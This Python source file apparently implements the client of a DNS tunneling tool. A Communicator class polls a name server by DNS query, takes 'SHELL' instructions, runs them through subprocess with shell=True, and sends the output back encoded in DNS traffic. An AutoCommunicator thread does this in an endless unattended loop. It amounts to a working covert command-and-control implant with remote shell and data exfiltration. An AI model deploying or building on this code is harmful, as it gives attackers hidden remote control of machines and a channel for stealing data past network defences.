import dns.message
import dns.flags
import dns.query
import dns.name
import dns.rdatatype
import dns.resolver
import subprocess
from threading import Thread
from time import sleep
from client_state import ClientState, ClientStateRequestHandler, ClientStateResponseHandler, ClientStateReader, \
    StateEnum
from live_output import RichOutput
from typing import Optional


class Communicator:

    def __init__(self, client_state: ClientState, domain: str, name_server: str, client_id: Optional[int] = None,
                 request_lag_seconds: int = 1, live_output: bool = False):
        # if no name-server is provided, get the first name-server configured by the system
        self._name_server = dns.resolver.get_default_resolver().nameservers[0] if name_server is None else name_server
        self._response_handler = ClientStateResponseHandler(client_state)
        self._request_handler = ClientStateRequestHandler(client_state, domain)
        self._state_reader = ClientStateReader(client_state)
        self._request_lag_seconds = request_lag_seconds

        if live_output:
            RichOutput(client_state=client_state)

        self.__is_id_set = False

        if client_id:
            self._response_handler.client_id(client_id_or_ip=client_id)
            self.__is_id_set = True

    @property
    def is_id_set(self):
        return self.__is_id_set

    def request_id(self) -> str:
        query = self._request_handler.request_id()
        response = dns.query.udp(query, self._name_server)
        r_type, [data] = self.unpack_response(response)

        self._response_handler.client_id(client_id_or_ip=data)

        self.__is_id_set = True

        return data

    def poll(self, auto_respond=False) -> str:
        query = self._request_handler.poll()
        response = dns.query.udp(query, self._name_server)
        _, data = self.unpack_response(response)

        match data:
            case [b"DATA", data]:
                self._response_handler.data(data, done=False)
                return self._continue()
            case [b"SHELL", data]:
                self._response_handler.command(data, done=False)
                command = self._continue()
                if auto_respond:
                    self.shell(command)
                    return f"EXECUTED: {command}"
                else:
                    return command
            case [b"NOTHING"]:
                if self._state_reader.read_state() == StateEnum.RECEIVING_DATA:
                    self._response_handler.data(b"", done=True)
                    return self._state_reader.read_latest_data()
                elif self._state_reader.read_state() == StateEnum.RECEIVING_SHELL:
                    return self._response_handler.command(b"", done=True)
                else:
                    return self._response_handler.nothing(data[0])

    def curl(self, webpage: str) -> str:
        query, done = self._request_handler.curl(webpage)
        response = dns.query.udp(query, self._name_server)

        if not done:
            response = self._continue_last_request()

        _, data = self.unpack_response(response)

        while data[0] != b"NOTHING":
            sleep(self._request_lag_seconds)
            self._response_handler.data(data[1], done=False)
            query = self._request_handler.continue_request()
            response = dns.query.udp(query, self._name_server)

            _, data = self.unpack_response(response)

        self._response_handler.data(b"", done=True)

        return self._state_reader.read_latest_data()

    def data(self, head: str, body: str) -> str:
        # send head
        query, done = self._request_handler.data(head, True)
        response = dns.query.udp(query, self._name_server)
        self._response_handler.add_response(self.unpack_response(response)[1][0])

        if not done:
            self._continue_last_request()

        # send body
        if self._request_lag_seconds:
            sleep(self._request_lag_seconds)
        query, done = self._request_handler.data(body, False)
        response = dns.query.udp(query, self._name_server)
        self._response_handler.add_response(self.unpack_response(response)[1][0])

        if not done:
            response = self._continue_last_request()

        return self.unpack_response(response)[1][0].decode('utf-8')

    def shell(self, command: str) -> str:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        data = process.communicate()[0].decode('utf-8')

        return self.data(head=command, body=data)

    def _continue(self) -> str:
        if self._request_lag_seconds:
            sleep(self._request_lag_seconds)

        query = self._request_handler.continue_request()
        response = dns.query.udp(query, self._name_server)
        _, data = self.unpack_response(response)

        match data:
            case [b"DATA", data]:
                self._response_handler.data(data, done=False)
                return self._continue()
            case [b"SHELL", data]:
                self._response_handler.command(data, done=False)
                return self._continue()
            case [b"NOTHING"]:
                if self._state_reader.read_state() == StateEnum.RECEIVING_DATA:
                    self._response_handler.data(b"", done=True)
                    return self._state_reader.read_latest_data()
                elif self._state_reader.read_state() == StateEnum.RECEIVING_SHELL:
                    return self._response_handler.command(b"", done=True)

    def _continue_last_request(self) -> dns.message.Message:
        done = False
        while not done:
            if self._request_lag_seconds:
                sleep(self._request_lag_seconds)
            query, done = self._request_handler.continue_last_request()
            response = dns.query.udp(query, self._name_server)
            self._response_handler.add_response(self.unpack_response(response)[1][0])

        return response

    @staticmethod
    def unpack_response(response: dns.message.Message) -> tuple[dns.rdatatype, list[bytes]]:
        answer = response.answer[0]
        response_type = dns.rdatatype.to_text(answer.rdtype)

        response_data = list(answer.items.keys())[0]

        if response_type == dns.rdatatype.A.name:
            return response_type, [response_data.address.encode('utf-8')]
        elif response_type == dns.rdatatype.TXT.name:
            return response_type, response_data.strings
        else:
            raise ValueError(f"RESPONSE TYPE {response_type} not supported")


class AutoCommunicator(Thread):

    def __init__(self, communicator: Communicator, poll_seconds: int):
        super().__init__(daemon=False)

        self._communicator = communicator
        self._poll_seconds = poll_seconds

        if not self._communicator.is_id_set:
            self._communicator.request_id()

        self.start()

    def run(self):
        while True:
            self._communicator.poll(auto_respond=True)
            sleep(self._poll_seconds)
